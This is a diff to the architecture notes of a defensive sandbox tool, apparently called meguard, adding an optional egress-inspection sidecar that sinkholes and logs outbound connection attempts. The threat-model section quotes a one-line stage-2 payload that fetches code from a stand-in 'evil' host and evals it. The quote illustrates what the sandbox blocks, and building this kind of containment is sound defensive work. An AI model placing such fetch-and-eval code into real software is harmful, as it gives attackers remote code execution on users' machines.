@@ -18,7 +18,9 @@ architecture.
   never imports analyze.
 - `internal/sandbox/` - the sandbox engine: the `Runner` interface, the
   `DockerRunner` CLI implementation, the `Profile` type, the pure `createArgs`
-  builder, and the `Execute` orchestrator. This package never imports analyze.
+  builder, the `Execute` orchestrator, and the optional `EgressInspector`
+  (`egress.go`: monitor argv, sinkhole script, and the pure `parseEgress`
+  parser). This package never imports analyze.
 
 ### The Runner interface
 
@@ -33,6 +35,17 @@ architecture.
 The only implementation is `DockerRunner`, which shells out to the `docker` CLI
 via `os/exec`. Defining the interface now keeps the door open for stronger
 backends without touching callers.
+
+There is one OPTIONAL companion interface, `EgressInspector` (in
+`internal/sandbox/egress.go`):
+
+    StartMonitor(ctx, Profile) (monitorName, error)
+    CollectEgress(ctx, monitorName) ([]EgressEvent, error)
+
+`Execute` type-asserts for it only when `Profile.InspectEgress` is set, so a
+`Runner` that does not implement it is unaffected and the default (`--network
+none`) path never touches egress code. `DockerRunner` implements it. See
+"Egress inspection" below.
 
 The container daemon is a TRUST BOUNDARY: it runs privileged, and meguard trusts
 it to enforce the isolation configured at create time. meguard does not trust the
@@ -114,9 +127,59 @@ hostile code: a container escape then lands as an unprivileged user instead of
 host root. The pre-run notice prints the chosen runtime and labels it the trust
 boundary.
 
+### Egress inspection (`--inspect-egress`)
+
+By default the sandbox gets `--network none`: there is no network stack at all,
+so a blocked connection attempt leaves no trace to report. `--inspect-egress`
+opts into a still-no-egress but OBSERVABLE posture, implemented as a monitor
+sidecar whose network namespace the sandbox joins:
+
+1. `StartMonitor` creates a hardened monitor container (`--cap-drop ALL` then
+   only `--cap-add NET_ADMIN` `--cap-add NET_RAW`, `no-new-privileges`,
+   `--read-only`, resource caps). It runs NO repo code.
+2. The monitor's shell (`monitorScript`) seals its netns: it deletes the real
+   default route, brings up a dummy `sink0` interface with a pinned next-hop
+   neighbour, points the default route at that sinkhole, adds a
+   belt-and-suspenders `iptables -A OUTPUT -o eth0 -j DROP`, and redirects DNS
+   (`iptables -t nat ... DNAT`) to the sinkhole so lookups are captured by name.
+   It prints a readiness marker, then execs
+   `tcpdump -i sink0 -n -l 'tcp[tcpflags] & tcp-syn != 0 or udp port 53'`.
+   Because the default route points at a dummy device, packets are transmitted
+   (and captured) but discarded; nothing leaves the host.
+3. `Execute` waits for the readiness marker (`waitForMonitorReady`) BEFORE
+   creating the sandbox. If it never arrives, the monitor is removed and the run
+   fails closed: the sandbox is never created, so it can never join an unsealed
+   netns.
+4. The sandbox is created with `--network container:<monitor>` (the ONE
+   conditional flag in `createArgs`, via `networkArgs`) and every other
+   hardening flag unchanged. It joins the netns but gains NO capability; the
+   kernel enforces the sinkhole rules and the unprivileged sandbox cannot alter
+   them.
+5. After the install, `CollectEgress` reads the monitor's captured output
+   (`docker logs`), and the pure `parseEgress` parser turns tcpdump lines into a
+   deduplicated, ordered `[]EgressEvent` (`tcp <ip:port>` or `dns <name>`).
+   Reading the monitor is best-effort: a failure to read is reported but does
+   NOT fail the run, because containment does not depend on the report.
+6. BOTH containers are force-removed. `Execute` defers a detached-context
+   `Remove` for the monitor and one for the sandbox; LIFO ordering removes the
+   sandbox (which shares the netns) before the monitor (invariant 5, extended to
+   the pair).
+
+Reporting is explicit: a clean inspected run states "0 outbound attempts", never
+silence; an unreadable monitor says so and never claims zero. The monitor image
+is `nicolaka/netshoot` by default and overridable with `--monitor-image`; it must
+provide `ip` (iproute2), `iptables`, and `tcpdump`.
+
+LIVE-VERIFICATION NOTE: the Go orchestration, argv, output, and `parseEgress`
+are unit tested. The in-container netns/iptables setup in `monitorScript` still
+needs one verification pass on a real Linux Docker host. The reliable guarantee
+is TCP SYN capture to any IP:port (the hardcoded-C2 case); DNS-name capture
+depends on the resolver redirect working against the runtime's embedded DNS.
+
 ## Hardening flags and the door each closes
 
-From `internal/sandbox/args.go`, all unconditional:
+From `internal/sandbox/args.go`, all unconditional except the network flag noted
+below:
 
 | Flag | Door it closes |
 | --- | --- |
@@ -130,7 +193,7 @@ From `internal/sandbox/args.go`, all unconditional:
 | `--pids-limit 512` | Cap fork bombs. |
 | `--memory 2g` | Cap memory (conservative; will be configurable). |
 | `--cpus 2` | Cap CPU (conservative; will be configurable). |
-| `--network none` | No egress at all; kills stage-2 payload fetches. |
+| `--network none` | No egress at all; kills stage-2 payload fetches. This is the ONLY conditional flag: with `--inspect-egress` it becomes `--network container:<monitor>` (join the monitor's sealed, no-route netns), which is still no egress but observable. See "Egress inspection". |
 | `-w /repo` | Work in the copied repo. |
 | `-e HOME=/home/sandbox` | HOME points at scratch tmpfs, not host home. |
 
@@ -150,7 +213,10 @@ What meguard denies:
   read.
 - Egress: `--network none` means a stage-2 fetch (for example
   `axios.get('https://evil/stage2').then(r => eval(r.data))`) cannot connect,
-  and any stolen data cannot be exfiltrated.
+  and any stolen data cannot be exfiltrated. With `--inspect-egress` the egress
+  is still fully denied, but each blocked attempt (including connections to
+  hardcoded IPs) is logged and reported, so you can SEE what the repo tried to
+  reach.
 - Persistence and escalation: read-only root, tmpfs-only writes, dropped caps,
   no-new-privileges, non-root user, and force-removal on exit leave nothing
   behind and nothing to escalate through.
@@ -158,8 +224,7 @@ What meguard denies:
 Out of current scope: kernel escapes from the container runtime and escapes
 through a rootful daemon (both reduced, not eliminated, by choosing a rootless
 runtime with `--runtime podman`, and further by the documented gVisor/Firecracker
-upgrade paths); and inspecting or reporting blocked egress attempts (a
-proxy-based feature is a TODO). The single largest residual risk is that the
+upgrade paths). The single largest residual risk is that the
 sandbox is only as strong as the runtime enforcing it on a shared host kernel:
 meguard raises the bar with cap-drop, no-new-privileges, read-only root,
 non-root user, and no network, but a kernel or root-daemon 0-day still reaches
